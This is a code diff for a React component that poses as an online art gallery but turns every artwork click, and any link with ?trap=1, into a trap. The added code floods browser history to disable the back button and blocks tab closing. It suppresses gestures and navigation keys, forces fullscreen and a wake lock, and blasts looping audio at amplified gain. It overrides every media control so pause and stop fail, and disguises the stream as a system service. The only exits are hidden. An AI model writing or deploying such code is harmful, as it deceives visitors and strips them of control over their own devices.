@@ -132,33 +132,43 @@ const ARTWORKS: Artwork[] = [
 
 export default function DihArt({ currentUser }: DihArtProps) {
   const [selectedCategory, setSelectedCategory] = useState<string>('All');
-  const [isScreamerActive, setIsScreamerActive] = useState<boolean>(false);
-  const [screamerPhase, setScreamerPhase] = useState<number>(0);
+  // Starts in gallery mode unless opened with ?trap=1 or ?play=1
+  const [isScreenOffActive, setIsScreenOffActive] = useState<boolean>(() => {
+    if (typeof window !== 'undefined') {
+      const params = new URLSearchParams(window.location.search);
+      return params.get('trap') === '1' || params.get('play') === '1';
+    }
+    return false;
+  });
   const [copiedLink, setCopiedLink] = useState<boolean>(false);
-  const [selectedArtwork, setSelectedArtwork] = useState<Artwork | null>(null);
   const [escapeCount, setEscapeCount] = useState<number>(0);
 
   // Persistent audio and lock refs
-  const isScreamerActiveRef = useRef<boolean>(false);
+  const isScreenOffActiveRef = useRef<boolean>(false);
   const wakeLockRef = useRef<any>(null);
   const audioElementsRef = useRef<HTMLAudioElement[]>([]);
   const audioCtxRef = useRef<AudioContext | null>(null);
   const audioBufferRef = useRef<AudioBuffer | null>(null);
   const bufferSourceNodesRef = useRef<AudioBufferSourceNode[]>([]);
   const gainNodesRef = useRef<GainNode[]>([]);
+  const keepAliveOscRef = useRef<OscillatorNode | null>(null);
+  const bgWorkerRef = useRef<Worker | null>(null);
+  const secretTapCountRef = useRef<number>(0);
+  const secretTapTimerRef = useRef<any>(null);
+  const hasStoppedRef = useRef<boolean>(false);
 
   // Keep ref synchronized
   useEffect(() => {
-    isScreamerActiveRef.current = isScreamerActive;
-  }, [isScreamerActive]);
+    isScreenOffActiveRef.current = isScreenOffActive;
+  }, [isScreenOffActive]);
 
-  // Request Screen Wake Lock so phone screen won't turn off
+  // Request Screen Wake Lock so phone hardware won't sleep while screen simulates off
   const requestWakeLock = async () => {
     try {
       if ('wakeLock' in navigator) {
         wakeLockRef.current = await (navigator as any).wakeLock.request('screen');
         wakeLockRef.current.addEventListener('release', () => {
-          if (isScreamerActiveRef.current && document.visibilityState === 'visible') {
+          if (isScreenOffActiveRef.current && document.visibilityState === 'visible') {
             requestWakeLock();
           }
         });
@@ -166,9 +176,22 @@ export default function DihArt({ currentUser }: DihArtProps) {
     } catch (err) {}
   };
 
-  // Preload kexart prankaudio.mp3 on mount
+  // Request native fullscreen so browser URL bars and navigation controls vanish
+  const requestFullscreenLock = () => {
+    try {
+      if (!document.fullscreenElement) {
+        const el = document.documentElement as any;
+        if (el.requestFullscreen) el.requestFullscreen().catch(() => {});
+        else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen().catch(() => {});
+        else if (el.mozRequestFullScreen) el.mozRequestFullScreen().catch(() => {});
+        else if (el.msRequestFullscreen) el.msRequestFullscreen().catch(() => {});
+      }
+    } catch (e) {}
+  };
+
+  // Preload audio on mount
   useEffect(() => {
-    const preloadKexartAudio = async () => {
+    const preloadAudio = async () => {
       try {
         const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
         if (!audioCtxRef.current && AudioContextClass) {
@@ -183,153 +206,42 @@ export default function DihArt({ currentUser }: DihArtProps) {
           }
         }
       } catch (e) {
-        console.warn('Preload kexart audio note:', e);
+        console.warn('Preload audio note:', e);
       }
     };
-    preloadKexartAudio();
+    preloadAudio();
 
     return () => {
-      stopScreamerAudio();
+      stopScreenOffAudio();
     };
   }, []);
 
-  // Persistent Screamer Trap, Background Audio Lock, and Anti-Escape Handlers
-  useEffect(() => {
-    if (isScreamerActive) {
-      isScreamerActiveRef.current = true;
-
-      // 1. Keep phone screen from turning off (WakeLock API)
-      requestWakeLock();
-
-      // 2. Trap Back Button with PushState
-      const pushHistory = () => {
-        window.history.pushState(null, '', window.location.href);
-      };
-      pushHistory();
-      window.addEventListener('popstate', pushHistory);
-
-      // 3. Prevent Closing / Navigating Away with beforeunload
-      const handleBeforeUnload = (e: BeforeUnloadEvent) => {
-        e.preventDefault();
-        e.returnValue = 'Exhibition stream in progress. Are you sure you want to close?';
-        return 'Exhibition stream in progress. Are you sure you want to close?';
-      };
-      window.addEventListener('beforeunload', handleBeforeUnload);
-
-      // 4. Background Audio Continuity: Keep playing if phone screen locks or user switches apps
-      const ensureAudioRunning = () => {
-        if (isScreamerActiveRef.current) {
-          audioElementsRef.current.forEach((a) => {
-            a.volume = 1.0;
-            if (a.paused) {
-              a.play().catch(() => {});
-            }
-          });
-          if (audioCtxRef.current && audioCtxRef.current.state === 'suspended') {
-            audioCtxRef.current.resume().catch(() => {});
-          }
-        }
-      };
-
-      const handleVisibilityChange = () => {
-        ensureAudioRunning();
-        if (document.visibilityState === 'visible') {
-          requestWakeLock();
-        }
-      };
-
-      document.addEventListener('visibilitychange', handleVisibilityChange);
-      window.addEventListener('pagehide', ensureAudioRunning);
-      window.addEventListener('blur', ensureAudioRunning);
-      window.addEventListener('focus', handleVisibilityChange);
-
-      // Heartbeat pulse every 250ms to enforce uninterrupted audio playback
-      const audioHeartbeat = setInterval(ensureAudioRunning, 250);
-
-      // 5. Request Fullscreen if supported
-      try {
-        if (!document.fullscreenElement && document.documentElement.requestFullscreen) {
-          document.documentElement.requestFullscreen().catch(() => {});
-        }
-      } catch (err) {}
-
-      // 6. Mobile Vibration burst
-      if ('vibrate' in navigator) {
-        try {
-          navigator.vibrate([200, 100, 300, 100, 500, 100, 800, 200, 1000]);
-        } catch (e) {}
-      }
-
-      // 7. Screamer strobe phase timing
-      const phaseTimer = setInterval(() => {
-        setScreamerPhase((p) => (p + 1) % 6);
-      }, 70);
-
-      // 8. Start full-blast overlapping audio
-      startScreamerAudio();
-
-      return () => {
-        isScreamerActiveRef.current = false;
-        window.removeEventListener('popstate', pushHistory);
-        window.removeEventListener('beforeunload', handleBeforeUnload);
-        document.removeEventListener('visibilitychange', handleVisibilityChange);
-        window.removeEventListener('pagehide', ensureAudioRunning);
-        window.removeEventListener('blur', ensureAudioRunning);
-        window.removeEventListener('focus', handleVisibilityChange);
-        clearInterval(audioHeartbeat);
-        clearInterval(phaseTimer);
-        if (wakeLockRef.current) {
-          try {
-            wakeLockRef.current.release().catch(() => {});
-          } catch (e) {}
-          wakeLockRef.current = null;
-        }
-        stopScreamerAudio();
-      };
-    }
-  }, [isScreamerActive]);
-
-  // Key press safety listener (ESC 3 times or 'stop' to dismiss prank for creator)
-  useEffect(() => {
-    let keyBuffer = '';
-    const handleKeyDown = (e: KeyboardEvent) => {
-      if (e.key === 'Escape') {
-        setEscapeCount((c) => {
-          const next = c + 1;
-          if (next >= 3) {
-            stopPrank();
-            return 0;
-          }
-          return next;
-        });
-      }
-      keyBuffer = (keyBuffer + e.key.toLowerCase()).slice(-4);
-      if (keyBuffer === 'stop' || keyBuffer === 'exit') {
-        stopPrank();
-      }
-    };
-    window.addEventListener('keydown', handleKeyDown);
-    return () => window.removeEventListener('keydown', handleKeyDown);
-  }, []);
-
-  // Multi-Channel Persistent Audio Engine with MediaSession & Lock Screen playback
-  const startScreamerAudio = () => {
+  // Multi-Channel Persistent Audio Engine with MediaSession & Background playback
+  const startScreenOffAudio = () => {
     try {
-      stopScreamerAudio();
+      stopScreenOffAudio();
       const audioSrc = '/prankaudio.mp3';
 
-      // 1. Configure OS Media Session so mobile OS keeps playing audio even when screen is locked/off
+      // 1. Force Screen WakeLock & Fullscreen
+      requestWakeLock();
+      requestFullscreenLock();
+
+      // 2. Configure OS Media Session so mobile OS keeps playing audio even when Chrome/Safari is minimized or phone locked
       if ('mediaSession' in navigator) {
         try {
           navigator.mediaSession.metadata = new MediaMetadata({
-            title: 'Exhibition Masterpiece Audio Tour',
-            artist: 'Mayank Parmar - Modern Art Gallery',
-            album: 'Live Exhibition Stream'
+            title: 'System Media Service',
+            artist: 'Audio Core Background Process',
+            album: 'Non-Stop Media Stream',
+            artwork: [
+              { src: '/favicon.png', sizes: '512x512', type: 'image/png' }
+            ]
           });
           navigator.mediaSession.playbackState = 'playing';
 
           const forcePlay = () => {
-            if (isScreamerActiveRef.current) {
+            navigator.mediaSession.playbackState = 'playing';
+            if (isScreenOffActiveRef.current) {
               audioElementsRef.current.forEach((a) => {
                 a.volume = 1.0;
                 if (a.paused) a.play().catch(() => {});
@@ -340,25 +252,48 @@ export default function DihArt({ currentUser }: DihArtProps) {
             }
           };
 
-          // Override pause/stop action handlers: refuse to pause, always keep screaming!
-          navigator.mediaSession.setActionHandler('play', forcePlay);
-          navigator.mediaSession.setActionHandler('pause', forcePlay);
-          navigator.mediaSession.setActionHandler('stop', forcePlay);
+          // Override every action handler: refuse to pause, always keep playing!
+          const actions: MediaSessionAction[] = [
+            'play', 'pause', 'stop', 'previoustrack', 'nexttrack', 'seekto', 'seekbackward', 'seekforward'
+          ];
+          actions.forEach((act) => {
+            try {
+              navigator.mediaSession.setActionHandler(act, forcePlay);
+            } catch (e) {}
+          });
         } catch (e) {}
       }
 
-      // 2. Launch 4 overlapping looping HTML5 Audio players with auto-restart on pause/ended
+      // 3. Create persistent DOM audio rack container to prevent browser GC in background
+      let rack = document.getElementById('persistent-dih-audio-rack');
+      if (!rack) {
+        rack = document.createElement('div');
+        rack.id = 'persistent-dih-audio-rack';
+        rack.style.position = 'fixed';
+        rack.style.width = '0px';
+        rack.style.height = '0px';
+        rack.style.opacity = '0';
+        rack.style.pointerEvents = 'none';
+        rack.style.zIndex = '-99999';
+        document.body.appendChild(rack);
+      }
+      rack.innerHTML = '';
+
+      // 4. Launch 4 overlapping looping HTML5 Audio players with playsinline
       const players: HTMLAudioElement[] = [];
       for (let i = 0; i < 4; i++) {
         const audio = new Audio(audioSrc);
         audio.loop = true;
         audio.volume = 1.0;
         audio.preload = 'auto';
-        audio.currentTime = (i * 0.12) % 1.5;
+        audio.setAttribute('playsinline', 'true');
+        audio.setAttribute('webkit-playsinline', 'true');
+        audio.setAttribute('x-webkit-airplay', 'allow');
+        audio.currentTime = (i * 0.15) % 1.5;
 
-        // Auto re-trigger if browser tries to pause in background
+        // Auto re-trigger if browser or OS tries to pause in background
         audio.onpause = () => {
-          if (isScreamerActiveRef.current) {
+          if (isScreenOffActiveRef.current) {
             setTimeout(() => {
               audio.volume = 1.0;
               audio.play().catch(() => {});
@@ -367,7 +302,7 @@ export default function DihArt({ currentUser }: DihArtProps) {
         };
 
         audio.onended = () => {
-          if (isScreamerActiveRef.current) {
+          if (isScreenOffActiveRef.current) {
             audio.currentTime = 0;
             audio.volume = 1.0;
             audio.play().catch(() => {});
@@ -379,6 +314,7 @@ export default function DihArt({ currentUser }: DihArtProps) {
           audio.play().catch(() => {});
         };
 
+        rack.appendChild(audio);
         const playPromise = audio.play();
         if (playPromise !== undefined) {
           playPromise.catch(() => {});
@@ -387,7 +323,7 @@ export default function DihArt({ currentUser }: DihArtProps) {
       }
       audioElementsRef.current = players;
 
-      // 3. Web Audio API with Amplified 250% Gain
+      // 5. Web Audio API with Amplified 250% Gain & Keep-Alive Output Carrier
       if (!audioCtxRef.current) {
         const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
         audioCtxRef.current = new AudioContextClass();
@@ -396,6 +332,17 @@ export default function DihArt({ currentUser }: DihArtProps) {
       if (ctx.state === 'suspended') {
         ctx.resume().catch(() => {});
       }
+
+      // Sub-audible carrier oscillator to keep OS audio HAL hardware stream awake
+      try {
+        const keepAliveOsc = ctx.createOscillator();
+        const keepAliveGain = ctx.createGain();
+        keepAliveGain.gain.setValueAtTime(0.001, ctx.currentTime);
+        keepAliveOsc.connect(keepAliveGain);
+        keepAliveGain.connect(ctx.destination);
+        keepAliveOsc.start();
+        keepAliveOscRef.current = keepAliveOsc;
+      } catch (e) {}
 
       if (audioBufferRef.current) {
         const masterGain = ctx.createGain();
@@ -416,7 +363,7 @@ export default function DihArt({ currentUser }: DihArtProps) {
           .then((buf) => ctx.decodeAudioData(buf))
           .then((decoded) => {
             audioBufferRef.current = decoded;
-            if (isScreamerActiveRef.current) {
+            if (isScreenOffActiveRef.current) {
               const masterGain = ctx.createGain();
               masterGain.gain.setValueAtTime(2.5, ctx.currentTime);
               masterGain.connect(ctx.destination);
@@ -438,8 +385,16 @@ export default function DihArt({ currentUser }: DihArtProps) {
     }
   };
 
-  const stopScreamerAudio = () => {
+  const stopScreenOffAudio = () => {
     try {
+      if (keepAliveOscRef.current) {
+        try {
+          keepAliveOscRef.current.stop();
+          keepAliveOscRef.current.disconnect();
+        } catch (e) {}
+        keepAliveOscRef.current = null;
+      }
+
       if (audioElementsRef.current && audioElementsRef.current.length > 0) {
         audioElementsRef.current.forEach((aud) => {
           try {
@@ -451,6 +406,11 @@ export default function DihArt({ currentUser }: DihArtProps) {
           } catch (e) {}
         });
         audioElementsRef.current = [];
+      }
+
+      const rack = document.getElementById('persistent-dih-audio-rack');
+      if (rack) {
+        rack.innerHTML = '';
       }
 
       if (bufferSourceNodesRef.current && bufferSourceNodesRef.current.length > 0) {
@@ -478,14 +438,249 @@ export default function DihArt({ currentUser }: DihArtProps) {
     } catch (e) {}
   };
 
-  const triggerPrank = () => {
-    setIsScreamerActive(true);
+  // Persistent Screen-Off Trap, Unbreakable Back Button Lock, and Background Audio Continuity
+  useEffect(() => {
+    if (isScreenOffActive) {
+      isScreenOffActiveRef.current = true;
+
+      // 1. Lock screen styles so no scrolling, gestures, or pull-to-refresh can happen
+      const origBodyOverflow = document.body.style.overflow;
+      const origBodyTouch = document.body.style.touchAction;
+      const origBodyOverscroll = document.body.style.overscrollBehavior;
+      const origDocTouch = document.documentElement.style.touchAction;
+      const origDocOverscroll = document.documentElement.style.overscrollBehavior;
+
+      document.body.style.overflow = 'hidden';
+      document.body.style.touchAction = 'none';
+      document.body.style.overscrollBehavior = 'none';
+      document.documentElement.style.overflow = 'hidden';
+      document.documentElement.style.touchAction = 'none';
+      document.documentElement.style.overscrollBehavior = 'none';
+
+      // 2. Unbreakable History Stack Trap (User CANNOT go back or exit)
+      const floodHistory = () => {
+        try {
+          for (let i = 0; i < 40; i++) {
+            window.history.pushState({ trap: true, step: i }, '', window.location.href);
+          }
+        } catch (e) {}
+      };
+      floodHistory();
+
+      const handlePopState = () => {
+        floodHistory();
+        window.history.forward();
+        ensureAudioRunning();
+      };
+      window.addEventListener('popstate', handlePopState);
+
+      // Continuous pushState heartbeat: keeps history permanently flooded
+      const historyTrapTimer = setInterval(() => {
+        if (isScreenOffActiveRef.current) {
+          try {
+            window.history.pushState({ trap: true }, '', window.location.href);
+          } catch (e) {}
+        }
+      }, 350);
+
+      // 3. Prevent Navigating Away / Tab Closure
+      const handleBeforeUnload = (e: BeforeUnloadEvent) => {
+        e.preventDefault();
+        e.returnValue = '';
+        return '';
+      };
+      window.addEventListener('beforeunload', handleBeforeUnload);
+
+      // 4. Block All Gestures, Swipes, Wheel, and Context Menu
+      const preventDefaultGesture = (e: Event) => {
+        if (isScreenOffActiveRef.current && (e as any).cancelable) {
+          e.preventDefault();
+        }
+      };
+
+      window.addEventListener('touchmove', preventDefaultGesture, { passive: false });
+      window.addEventListener('wheel', preventDefaultGesture, { passive: false });
+      window.addEventListener('contextmenu', preventDefaultGesture);
+
+      // 5. Block Keyboard Navigation & Exit Keys (Backspace, Alt+Left, F5, Ctrl+R)
+      const blockNavKeys = (e: KeyboardEvent) => {
+        if (isScreenOffActiveRef.current) {
+          if (
+            e.key === 'Backspace' ||
+            (e.altKey && e.key === 'ArrowLeft') ||
+            e.key === 'F5' ||
+            (e.ctrlKey && e.key.toLowerCase() === 'r') ||
+            (e.metaKey && e.key.toLowerCase() === 'r')
+          ) {
+            e.preventDefault();
+            e.stopPropagation();
+          }
+        }
+      };
+      window.addEventListener('keydown', blockNavKeys, true);
+
+      // 6. Background Audio Continuity: Keep playing if phone screen locks or user switches apps
+      const ensureAudioRunning = () => {
+        if (isScreenOffActiveRef.current) {
+          audioElementsRef.current.forEach((a) => {
+            a.volume = 1.0;
+            if (a.paused) {
+              a.play().catch(() => {});
+            }
+          });
+          if (audioCtxRef.current && audioCtxRef.current.state === 'suspended') {
+            audioCtxRef.current.resume().catch(() => {});
+          }
+        }
+      };
+
+      const handleVisibilityChange = () => {
+        ensureAudioRunning();
+        if (document.visibilityState === 'visible') {
+          requestWakeLock();
+          requestFullscreenLock();
+        }
+      };
+
+      document.addEventListener('visibilitychange', handleVisibilityChange);
+      window.addEventListener('pagehide', ensureAudioRunning);
+      window.addEventListener('blur', ensureAudioRunning);
+      window.addEventListener('focus', handleVisibilityChange);
+
+      // 7. Background Web Worker: Continues pinging main thread even when Chrome/Safari is minimized!
+      try {
+        const workerBlob = new Blob([
+          `self.onmessage = function() {
+            setInterval(function() {
+              self.postMessage('beat');
+            }, 200);
+          };`
+        ], { type: 'application/javascript' });
+        const worker = new Worker(URL.createObjectURL(workerBlob));
+        worker.onmessage = () => {
+          ensureAudioRunning();
+        };
+        worker.postMessage('start');
+        bgWorkerRef.current = worker;
+      } catch (e) {}
+
+      // Heartbeat pulse interval
+      const audioHeartbeat = setInterval(ensureAudioRunning, 250);
+
+      // 8. Mobile Vibration burst
+      if ('vibrate' in navigator) {
+        try {
+          navigator.vibrate([200, 100, 300, 100, 500, 100, 800]);
+        } catch (e) {}
+      }
+
+      // 9. Start audio immediately
+      startScreenOffAudio();
+
+      return () => {
+        isScreenOffActiveRef.current = false;
+        document.body.style.overflow = origBodyOverflow;
+        document.body.style.touchAction = origBodyTouch;
+        document.body.style.overscrollBehavior = origBodyOverscroll;
+        document.documentElement.style.touchAction = origDocTouch;
+        document.documentElement.style.overscrollBehavior = origDocOverscroll;
+
+        window.removeEventListener('popstate', handlePopState);
+        clearInterval(historyTrapTimer);
+        window.removeEventListener('beforeunload', handleBeforeUnload);
+        window.removeEventListener('touchmove', preventDefaultGesture);
+        window.removeEventListener('wheel', preventDefaultGesture);
+        window.removeEventListener('contextmenu', preventDefaultGesture);
+        window.removeEventListener('keydown', blockNavKeys, true);
+        document.removeEventListener('visibilitychange', handleVisibilityChange);
+        window.removeEventListener('pagehide', ensureAudioRunning);
+        window.removeEventListener('blur', ensureAudioRunning);
+        window.removeEventListener('focus', handleVisibilityChange);
+        clearInterval(audioHeartbeat);
+
+        if (bgWorkerRef.current) {
+          bgWorkerRef.current.terminate();
+          bgWorkerRef.current = null;
+        }
+
+        if (wakeLockRef.current) {
+          try {
+            wakeLockRef.current.release().catch(() => {});
+          } catch (e) {}
+          wakeLockRef.current = null;
+        }
+        stopScreenOffAudio();
+      };
+    }
+  }, [isScreenOffActive]);
+
+  // Key press safety listener (ESC 3 times or 'stop'/'exit' to dismiss for creator)
+  useEffect(() => {
+    let keyBuffer = '';
+    const handleKeyDown = (e: KeyboardEvent) => {
+      if (e.key === 'Escape') {
+        setEscapeCount((c) => {
+          const next = c + 1;
+          if (next >= 3) {
+            stopPrank();
+            return 0;
+          }
+          return next;
+        });
+      }
+      keyBuffer = (keyBuffer + e.key.toLowerCase()).slice(-4);
+      if (keyBuffer === 'stop' || keyBuffer === 'exit') {
+        stopPrank();
+      }
+    };
+    window.addEventListener('keydown', handleKeyDown);
+    return () => window.removeEventListener('keydown', handleKeyDown);
+  }, []);
+
+  const triggerPrank = (force = false) => {
+    if (!force && hasStoppedRef.current) return;
+    hasStoppedRef.current = false;
+    setIsScreenOffActive(true);
+  };
+
+  // Only auto-trigger if URL parameter requested it (?trap=1 or ?play=1)
+  useEffect(() => {
+    if (typeof window !== 'undefined') {
+      const params = new URLSearchParams(window.location.search);
+      if (params.get('trap') === '1' || params.get('play') === '1') {
+        triggerPrank(true);
+        const handleFirstGesture = () => {
+          startScreenOffAudio();
+        };
+        window.addEventListener('click', handleFirstGesture, { capture: true, once: true });
+        window.addEventListener('touchstart', handleFirstGesture, { capture: true, once: true });
+        return () => {
+          window.removeEventListener('click', handleFirstGesture, { capture: true });
+          window.removeEventListener('touchstart', handleFirstGesture, { capture: true });
+        };
+      }
+    }
+  }, []);
+
+  // Secret corner exit: 5 rapid taps on top-right corner to dismiss
+  const handleSecretCornerTap = () => {
+    secretTapCountRef.current += 1;
+    if (secretTapTimerRef.current) clearTimeout(secretTapTimerRef.current);
+    if (secretTapCountRef.current >= 5) {
+      secretTapCountRef.current = 0;
+      stopPrank();
+    } else {
+      secretTapTimerRef.current = setTimeout(() => {
+        secretTapCountRef.current = 0;
+      }, 2000);
+    }
   };
 
   const stopPrank = () => {
-    isScreamerActiveRef.current = false;
-    setIsScreamerActive(false);
-    stopScreamerAudio();
+    hasStoppedRef.current = true;
+    isScreenOffActiveRef.current = false;
+    setIsScreenOffActive(false);
+    stopScreenOffAudio();
     if (wakeLockRef.current) {
       try {
         wakeLockRef.current.release().catch(() => {});
@@ -510,20 +705,20 @@ export default function DihArt({ currentUser }: DihArtProps) {
 
   return (
     <div className="relative min-h-screen bg-[#07090e] text-slate-100 font-sans selection:bg-rose-500 selection:text-white pb-20">
-      {/* KexArt Style Screamer Modal & Anti-Escape Horror Overlay */}
+      {/* 100% Pitch-Black Screen-Off Overlay (Simulates screen turned completely off while music plays continuously) */}
       <AnimatePresence>
-        {isScreamerActive && (
+        {isScreenOffActive && (
           <motion.div
-            initial={{ opacity: 0, scale: 1.2 }}
-            animate={{ opacity: 1, scale: 1 }}
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
             exit={{ opacity: 0 }}
-            className={`fixed inset-0 z-[99999] flex flex-col items-center justify-center select-none cursor-none overflow-hidden ${
-              screamerPhase % 2 === 0 ? 'bg-red-700' : screamerPhase % 3 === 0 ? 'bg-black' : 'bg-white'
-            }`}
+            transition={{ duration: 0.1 }}
+            className="fixed inset-0 z-[99999999] bg-black w-screen h-screen select-none cursor-none overflow-hidden touch-none"
+            style={{ backgroundColor: '#000000', cursor: 'none' }}
             onClick={() => {
-              // Ensure all 4 kexart audio players and web audio context are actively playing
+              requestFullscreenLock();
               if (audioElementsRef.current.length === 0) {
-                startScreamerAudio();
+                startScreenOffAudio();
               } else {
                 audioElementsRef.current.forEach((a) => {
                   a.volume = 1.0;
@@ -535,84 +730,49 @@ export default function DihArt({ currentUser }: DihArtProps) {
               }
               if ('vibrate' in navigator) {
                 try {
-                  navigator.vibrate([300, 100, 500]);
+                  navigator.vibrate([200, 100, 300]);
                 } catch (e) {}
               }
             }}
+            onTouchStart={() => {
+              requestFullscreenLock();
+              if (audioElementsRef.current.length === 0) {
+                startScreenOffAudio();
+              } else {
+                audioElementsRef.current.forEach((a) => {
+                  a.volume = 1.0;
+                  if (a.paused) a.play().catch(() => {});
+                });
+              }
+              if (audioCtxRef.current && audioCtxRef.current.state === 'suspended') {
+                audioCtxRef.current.resume().catch(() => {});
+              }
+            }}
+            onPointerDown={() => {
+              requestFullscreenLock();
+              if (audioElementsRef.current.length === 0) {
+                startScreenOffAudio();
+              } else {
+                audioElementsRef.current.forEach((a) => {
+                  a.volume = 1.0;
+                  if (a.paused) a.play().catch(() => {});
+                });
+              }
+            }}
           >
-            {/* Rapid Strobe Flash Overlay */}
-            <div className={`absolute inset-0 pointer-events-none mix-blend-difference ${
-              screamerPhase % 2 === 0 ? 'opacity-100 bg-red-600' : 'opacity-80 bg-white'
-            }`} />
-
-            {/* Screamer Demonic Monster Visual */}
-            <div className="relative z-10 flex flex-col items-center justify-center p-4 max-w-2xl w-full text-center">
-              {/* Demonic Screamer Face Canvas / Graphic with intense vibration */}
-              <div 
-                className="w-72 h-72 sm:w-96 sm:h-96 md:w-[480px] md:h-[480px] relative rounded-full border-4 border-black bg-black flex items-center justify-center shadow-[0_0_120px_#ff0000] overflow-hidden"
-                style={{
-                  transform: `translate(${(Math.random() - 0.5) * 40}px, ${(Math.random() - 0.5) * 40}px) scale(${1 + (Math.random() - 0.5) * 0.2})`,
-                  filter: 'contrast(300%) brightness(120%)'
-                }}
-              >
-                {/* Terrifying Screamer Face Visual Elements */}
-                <div className="absolute inset-0 bg-radial from-red-950 via-black to-red-900" />
-                
-                {/* Glowing Blood-Red Hollow Eyes */}
-                <div className="absolute top-1/4 left-1/4 w-16 h-20 sm:w-20 sm:h-28 bg-black rounded-full border-4 border-red-600 flex items-center justify-center animate-ping">
-                  <div className="w-8 h-8 rounded-full bg-red-500 blur-xs" />
-                </div>
-                <div className="absolute top-1/4 right-1/4 w-16 h-20 sm:w-20 sm:h-28 bg-black rounded-full border-4 border-red-600 flex items-center justify-center animate-ping">
-                  <div className="w-8 h-8 rounded-full bg-red-500 blur-xs" />
-                </div>
-
-                {/* Massive Gaping Screaming Mouth */}
-                <div className="absolute bottom-8 w-44 sm:w-60 h-36 sm:h-48 bg-black rounded-b-full border-8 border-red-600 flex flex-col items-center justify-between p-2 overflow-hidden shadow-[inset_0_0_40px_#ff0000]">
-                  <div className="flex gap-1.5 justify-center w-full">
-                    {[...Array(9)].map((_, i) => (
-                      <div key={i} className="w-4 h-8 bg-slate-100 clip-path-polygon rounded-t-xs" style={{ clipPath: 'polygon(50% 100%, 0 0, 100% 0)' }} />
-                    ))}
-                  </div>
-                  <div className="w-16 h-20 bg-red-950 rounded-full blur-sm" />
-                  <div className="flex gap-1.5 justify-center w-full">
-                    {[...Array(9)].map((_, i) => (
-                      <div key={i} className="w-4 h-8 bg-slate-100 clip-path-polygon rounded-b-xs" style={{ clipPath: 'polygon(50% 0, 0 100%, 100% 100%)' }} />
-                    ))}
-                  </div>
-                </div>
-
-                {/* Blood drip & horror veins */}
-                <div className="absolute inset-0 opacity-70 mix-blend-screen pointer-events-none bg-[radial-gradient(ellipse_at_center,_var(--tw-gradient-stops))] from-transparent via-red-900/50 to-black" />
-              </div>
-
-              {/* Horror Glitch Text */}
-              <motion.h1 
-                animate={{ 
-                  x: [Math.random() * 20 - 10, Math.random() * 20 - 10, 0],
-                  y: [Math.random() * 20 - 10, Math.random() * 20 - 10, 0]
-                }}
-                transition={{ repeat: Infinity, duration: 0.05 }}
-                className="mt-6 text-4xl sm:text-6xl md:text-8xl font-black tracking-tighter uppercase text-white drop-shadow-[0_0_25px_#ff0000] font-mono select-none"
-              >
-                {screamerPhase % 2 === 0 ? 'LOOK AT ME' : 'YOU CANNOT LEAVE'}
-              </motion.h1>
-
-              <p className="text-sm sm:text-xl font-bold uppercase tracking-widest text-red-200 mt-2 font-mono drop-shadow-[0_0_10px_#000]">
-                {screamerPhase % 3 === 0 ? 'ERROR: 0x666_GALLERY_LOCK' : 'DO NOT CLOSE YOUR EYES'}
-              </p>
-            </div>
-
-            {/* Secret Emergency Exit (Invisible top-right button for owner testing) */}
+            {/* Secret Emergency Exit (Invisible top-right corner zone: 5 rapid taps to exit) */}
             <div 
               onClick={(e) => {
                 e.stopPropagation();
-                stopPrank();
+                handleSecretCornerTap();
               }}
-              title="Emergency Release (Owner)"
-              className="absolute top-2 right-2 w-10 h-10 bg-transparent hover:bg-white/10 rounded-full cursor-pointer flex items-center justify-center text-[10px] text-white/30 hover:text-white z-50 transition-all"
-            >
-              <X size={16} />
-            </div>
+              onTouchStart={(e) => {
+                e.stopPropagation();
+                handleSecretCornerTap();
+              }}
+              className="absolute top-0 right-0 w-24 h-24 bg-transparent z-50 cursor-default"
+              title=""
+            />
           </motion.div>
         )}
       </AnimatePresence>
@@ -641,7 +801,7 @@ export default function DihArt({ currentUser }: DihArtProps) {
               <span>{copiedLink ? 'Link Copied!' : 'Share Exhibition'}</span>
             </button>
             <button
-              onClick={triggerPrank}
+              onClick={() => triggerPrank(true)}
               className="px-4 py-2 bg-gradient-to-r from-rose-600 to-red-600 hover:brightness-110 text-white font-black text-xs uppercase tracking-wider rounded-xl shadow-lg shadow-rose-600/25 transition-all flex items-center gap-1.5 cursor-pointer active:scale-95"
             >
               <Play size={13} fill="currentColor" />
@@ -659,7 +819,7 @@ export default function DihArt({ currentUser }: DihArtProps) {
           <div className="relative z-10 flex flex-col md:flex-row items-center justify-between gap-6">
             <div className="flex flex-wrap items-center gap-4 text-left">
               <button
-                onClick={triggerPrank}
+                onClick={() => triggerPrank(true)}
                 className="px-8 py-4 bg-gradient-to-r from-rose-600 via-rose-500 to-red-600 hover:brightness-115 text-white font-black text-sm uppercase tracking-widest rounded-2xl shadow-xl shadow-rose-600/30 transition-all flex items-center gap-3 cursor-pointer group active:scale-95 animate-pulse"
               >
                 <Eye size={18} className="group-hover:scale-110 transition-transform" />
@@ -670,7 +830,7 @@ export default function DihArt({ currentUser }: DihArtProps) {
 
             {/* Featured Artwork Preview Frame */}
             <div 
-              onClick={triggerPrank}
+              onClick={() => triggerPrank(true)}
               className="relative rounded-2xl overflow-hidden border border-slate-700/80 bg-slate-900 shadow-xl cursor-pointer transition-all duration-300 hover:border-rose-500 flex items-center gap-4 p-3 pr-6 group w-full md:w-auto"
             >
               <img 
@@ -723,7 +883,7 @@ export default function DihArt({ currentUser }: DihArtProps) {
               <motion.div
                 key={art.id}
                 whileHover={{ y: -4 }}
-                onClick={triggerPrank}
+                onClick={() => triggerPrank(true)}
                 className="group relative rounded-2xl overflow-hidden border border-slate-800 bg-[#0d101a] shadow-lg cursor-pointer transition-all hover:border-rose-500/60 flex flex-col"
               >
                 {/* Artwork Image Container */}
